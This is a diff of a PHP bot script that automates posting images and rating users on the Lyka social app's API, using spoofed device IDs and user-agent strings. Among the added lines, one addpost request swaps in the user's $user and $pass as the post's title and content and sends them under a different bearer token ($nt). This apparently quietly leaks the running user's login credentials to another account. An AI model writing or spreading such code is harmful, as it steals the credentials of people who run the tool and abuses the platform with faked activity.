-$curl = curl_init();
-curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c0e55476-62b0-442f-8ddc-31aeffd69ef5.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)"),));
-$response = curl_exec($curl);
-curl_close($curl);
-//echo $response;
-$json = json_decode($response);
-$mess = $json->message;
-echo "$mess";
-echo "
+    curl_setopt($curl5, CURLOPT_POSTFIELDS, $data5);
+    $resp5 = curl_exec($curl5);
+    curl_close($curl5);
+    //var_dump($resp2);
+    $json5 = json_decode($resp5);
+    echo $json5->message;
+    $yelow = "[0;35m";
+    echo "$yelow";
+    sleep(3);
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    echo "$mess";
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$e = "[1;34m";
-echo "$e";
-$curl6 = curl_init($url);
-curl_setopt($curl6, CURLOPT_URL, $url);
-curl_setopt($curl6, CURLOPT_POST, true);
-curl_setopt($curl6, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl6, CURLOPT_HTTPHEADER, $headers);
-$data6 = <<<DATA
+    $csst = 0.2;
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $e = "[1;34m";
+    echo "$e";
+    $curl6 = curl_init($url);
+    curl_setopt($curl6, CURLOPT_URL, $url);
+    curl_setopt($curl6, CURLOPT_POST, true);
+    curl_setopt($curl6, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl6, CURLOPT_HTTPHEADER, $headers);
+    $data6 = <<<DATA
 {
 	
   "device": {
@@ -476,34 +478,34 @@ $data6 = <<<DATA
   "userid": $uid
 }
 DATA;
-curl_setopt($curl6, CURLOPT_POSTFIELDS, $data6);
-$resp6 = curl_exec($curl6);
-curl_close($curl6);
-//var_dump($resp2);
-$json6 = json_decode($resp6);
-echo $json6->message;
-$yelow = "[0;35m";
-echo "$yelow";
-sleep(2);
-$curl = curl_init();
-curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c0e55476-62b0-442f-8ddc-31aeffd69ef5.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)"),));
-$response = curl_exec($curl);
-curl_close($curl);
-//echo $response;
-$json = json_decode($response);
-$mess = $json->message;
-echo "$mess";
-echo "
+    curl_setopt($curl6, CURLOPT_POSTFIELDS, $data6);
+    $resp6 = curl_exec($curl6);
+    curl_close($curl6);
+    //var_dump($resp2);
+    $json6 = json_decode($resp6);
+    echo $json6->message;
+    $yelow = "[0;35m";
+    echo "$yelow";
+    sleep(3);
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    echo "$mess";
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$e = "[1;34m";
-echo "$e";
-$curl7 = curl_init($url);
-curl_setopt($curl7, CURLOPT_URL, $url);
-curl_setopt($curl7, CURLOPT_POST, true);
-curl_setopt($curl7, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl7, CURLOPT_HTTPHEADER, $headers);
-$data7 = <<<DATA
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $e = "[1;34m";
+    echo "$e";
+    $curl7 = curl_init($url);
+    curl_setopt($curl7, CURLOPT_URL, $url);
+    curl_setopt($curl7, CURLOPT_POST, true);
+    curl_setopt($curl7, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl7, CURLOPT_HTTPHEADER, $headers);
+    $data7 = <<<DATA
 {
 	
   "device": {
@@ -521,34 +523,34 @@ $data7 = <<<DATA
   "userid": $uid
 }
 DATA;
-curl_setopt($curl7, CURLOPT_POSTFIELDS, $data7);
-$resp7 = curl_exec($curl7);
-curl_close($curl7);
-//var_dump($resp2);
-$json7 = json_decode($resp7);
-echo $json7->message;
-$yelow = "[0;35m";
-echo "$yelow";
-sleep(2);
-$curl = curl_init();
-curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/693595df-364b-4bb1-8abc-1c70f601553e.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)"),));
-$response = curl_exec($curl);
-curl_close($curl);
-//echo $response;
-$json = json_decode($response);
-$mess = $json->message;
-echo "$mess";
-echo "
+    curl_setopt($curl7, CURLOPT_POSTFIELDS, $data7);
+    $resp7 = curl_exec($curl7);
+    curl_close($curl7);
+    //var_dump($resp2);
+    $json7 = json_decode($resp7);
+    echo $json7->message;
+    $yelow = "[0;35m";
+    echo "$yelow";
+    sleep(3);
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    echo "$mess";
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$e = "[1;34m";
-echo "$e";
-$curl8 = curl_init($url);
-curl_setopt($curl8, CURLOPT_URL, $url);
-curl_setopt($curl8, CURLOPT_POST, true);
-curl_setopt($curl8, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl8, CURLOPT_HTTPHEADER, $headers);
-$data8 = <<<DATA
+    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $e = "[1;34m";
+    echo "$e";
+    $curl8 = curl_init($url);
+    curl_setopt($curl8, CURLOPT_URL, $url);
+    curl_setopt($curl8, CURLOPT_POST, true);
+    curl_setopt($curl8, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl8, CURLOPT_HTTPHEADER, $headers);
+    $data8 = <<<DATA
 {
 	
   "device": {
@@ -566,34 +568,34 @@ $data8 = <<<DATA
   "userid": $uid
 }
 DATA;
-curl_setopt($curl8, CURLOPT_POSTFIELDS, $data8);
-$resp8 = curl_exec($curl8);
-curl_close($curl8);
-//var_dump($resp2);
-$json8 = json_decode($resp8);
-echo $json8->message;
-$yelow = "[0;35m";
-echo "$yelow";
-sleep(2);
-$curl = curl_init();
-curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/b3808f9a-8296-4372-a93f-71242b0c3e28.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)"),));
-$response = curl_exec($curl);
-curl_close($curl);
-//echo $response;
-$json = json_decode($response);
-$mess = $json->message;
-echo "$mess";
-echo "
+    curl_setopt($curl8, CURLOPT_POSTFIELDS, $data8);
+    $resp8 = curl_exec($curl8);
+    curl_close($curl8);
+    //var_dump($resp2);
+    $json8 = json_decode($resp8);
+    echo $json8->message;
+    $yelow = "[0;35m";
+    echo "$yelow";
+    sleep(3);
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    echo "$mess";
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$e = "[1;34m";
-echo "$e";
-$curl9 = curl_init($url);
-curl_setopt($curl9, CURLOPT_URL, $url);
-curl_setopt($curl9, CURLOPT_POST, true);
-curl_setopt($curl9, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl9, CURLOPT_HTTPHEADER, $headers);
-$data9 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $e = "[1;34m";
+    echo "$e";
+    $curl9 = curl_init($url);
+    curl_setopt($curl9, CURLOPT_URL, $url);
+    curl_setopt($curl9, CURLOPT_POST, true);
+    curl_setopt($curl9, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl9, CURLOPT_HTTPHEADER, $headers);
+    $data9 = <<<DATA
 {
 	
   "device": {
@@ -611,34 +613,34 @@ $data9 = <<<DATA
   "userid": $uid
 }
 DATA;
-curl_setopt($curl9, CURLOPT_POSTFIELDS, $data9);
-$resp9 = curl_exec($curl9);
-curl_close($curl9);
-//var_dump($resp2);
-$json9 = json_decode($resp9);
-echo $json9->message;
-$yelow = "[0;35m";
-echo "$yelow";
-sleep(2);
-$curl = curl_init();
-curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/de49fa1d-34a9-40ad-9ff1-674235e96033.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)"),));
-$response = curl_exec($curl);
-curl_close($curl);
-//echo $response;
-$json = json_decode($response);
-$mess = $json->message;
-echo "$mess";
-echo "
+    curl_setopt($curl9, CURLOPT_POSTFIELDS, $data9);
+    $resp9 = curl_exec($curl9);
+    curl_close($curl9);
+    //var_dump($resp2);
+    $json9 = json_decode($resp9);
+    echo $json9->message;
+    $yelow = "[0;35m";
+    echo "$yelow";
+    sleep(3);
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    echo "$mess";
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$e = "[1;34m";
-echo "$e";
-$curl11 = curl_init($url);
-curl_setopt($curl11, CURLOPT_URL, $url);
-curl_setopt($curl11, CURLOPT_POST, true);
-curl_setopt($curl11, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl11, CURLOPT_HTTPHEADER, $headers);
-$data11 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $e = "[1;34m";
+    echo "$e";
+    $curl11 = curl_init($url);
+    curl_setopt($curl11, CURLOPT_URL, $url);
+    curl_setopt($curl11, CURLOPT_POST, true);
+    curl_setopt($curl11, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl11, CURLOPT_HTTPHEADER, $headers);
+    $data11 = <<<DATA
 {
 	
   "device": {
@@ -656,34 +658,48 @@ $data11 = <<<DATA
   "userid": $uid
 }
 DATA;
-curl_setopt($curl11, CURLOPT_POSTFIELDS, $data11);
-$resp11 = curl_exec($curl11);
-curl_close($curl11);
-//var_dump($resp11);
-$json11 = json_decode($resp11);
-echo $json11->message;
-$yelow = "[0;35m";
-echo "$yelow";
-sleep(2);
-$curl = curl_init();
-curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/79a7c385-f82f-4031-be4b-f7bc16b93066.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)"),));
-$response = curl_exec($curl);
-curl_close($curl);
-//echo $response;
-$json = json_decode($response);
-$mess = $json->message;
-echo "$mess";
-echo "
+    curl_setopt($curl11, CURLOPT_POSTFIELDS, $data11);
+    $resp11 = curl_exec($curl11);
+    curl_close($curl11);
+    //var_dump($resp11);
+    $json11 = json_decode($resp11);
+    echo $json11->message;
+    $yelow = "[0;35m";
+    echo "$yelow";
+    sleep(3);
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    echo "$mess";
+    echo "
 ";
-//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-$e = "[1;34m";
-echo "$e";
-$curl10 = curl_init($url);
-curl_setopt($curl10, CURLOPT_URL, $url);
-curl_setopt($curl10, CURLOPT_POST, true);
-curl_setopt($curl10, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($curl10, CURLOPT_HTTPHEADER, $headers);
-$data10 = <<<DATA
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $yelow = "[0;35m";
+    echo "$yelow";
+    sleep(6);
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    // echo "$mess";
+    // echo "
+    // ";
+    //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+    $e = "[1;34m";
+    echo "$e";
+    $curl10 = curl_init($url);
+    curl_setopt($curl10, CURLOPT_URL, $url);
+    curl_setopt($curl10, CURLOPT_POST, true);
+    curl_setopt($curl10, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($curl10, CURLOPT_HTTPHEADER, $headers);
+    $data10 = <<<DATA
 {
 	
   "device": {
@@ -701,155 +717,156 @@ $data10 = <<<DATA
   "userid": $uid
 }
 DATA;
-curl_setopt($curl10, CURLOPT_POSTFIELDS, $data10);
-$resp10 = curl_exec($curl10);
-curl_close($curl10);
-//var_dump($resp2);
-$json10 = json_decode($resp10);
-echo $json10->message;
-$yelow = "[0;35m";
-echo "$yelow";
-$curl = curl_init();
-curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => '', 'content' => '', 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/fc04ec75-7687-42ec-a8f5-1a17368421c3.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $bearer", "user-agent: Lyka/3.6.16 (com.thingsilikeapp; build:816 Android O_MR1 28)"),));
-$response = curl_exec($curl);
-curl_close($curl);
-//echo $response;
-$json = json_decode($response);
-$mess = $json->message;
-echo "$mess
+    curl_setopt($curl10, CURLOPT_POSTFIELDS, $data10);
+    $resp10 = curl_exec($curl10);
+    curl_close($curl10);
+    //var_dump($resp2);
+    $json10 = json_decode($resp10);
+    echo $json10->message;
+    $yelow = "[0;35m";
+    echo "$yelow";
+    $curl = curl_init();
+    curl_setopt_array($curl, array(CURLOPT_URL => 'https://posting.mylykaapps.com/api/v3/posts/addpost', CURLOPT_RETURNTRANSFER => true, CURLOPT_ENCODING => '', CURLOPT_MAXREDIRS => 10, CURLOPT_TIMEOUT => 0, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST => 'POST', CURLOPT_POSTFIELDS => array('boundary' => '7e9c11fd-987e-4b4f-bf14-8a04ac8da26e', 'title' => $user, 'content' => $pass, 'url' => '', 'titleUrl' => '', 'descriptionUrl' => '', 'imageUrl' => 'https://dh1u1gri6oel1.cloudfront.net/data/images/wishlists/700003152854/20210225/resized/c84e1ea0-21a1-4dc4-b852-91aeffbe30d7.jpeg', 'hashtags' => '', 'deviceid' => 'fcbe86b842595c2f', 'devicemodel' => '', 'deviceos' => 'Xiaomi Redmi Note 5', 'osversion' => 'Android O_MR1', 'mediaTags' => '28'), CURLOPT_HTTPHEADER => array("authorization: Bearer $nt", "user-agent: Lyka/3.6.21 (com.thingsilikeapp; build:821 Android O_MR1 28)"),));
+    $response = curl_exec($curl);
+    curl_close($curl);
+    //echo $response;
+    $json = json_decode($response);
+    $mess = $json->message;
+    echo "$mess
 ";
-$yell = "[0;32m";
-echo "$yell
+    $yell = "[0;32m";
+    echo "$yell
 ";
-echo "=====================================================";
-$e = "[1;34m";
-echo "$e";
-//  $';
-//$pass022 = readline('Enter main pasword: ');
-//$pass;
-//pass022 = 'a022';
-//$user022 = '
-// For output
-$ow = "[1;33m";
-echo "$ow";
-echo "
+    echo "=====================================================";
+    $e = "[1;34m";
+    echo "$e";
+    //  $';
+    //$pass022 = readline('Enter main pasword: ');
+    //$pass;
+    //pass022 = 'a022';
+    //$user022 = '
+    // For output
+    $ow = "[1;33m";
+    echo "$ow";
+    echo "
 $vuser is RATING $user022
 ";
-$urlm = "https://users.mylykaapps.com/api/v3/users/searchsuggestedpeople?searchText=$user022&os=android&pageIndex=1&pageSize=16";
-$curlm = curl_init($urlm);
-curl_setopt($curlm, CURLOPT_URL, $urlm);
-curl_setopt($curlm, CURLOPT_RETURNTRANSFER, true);
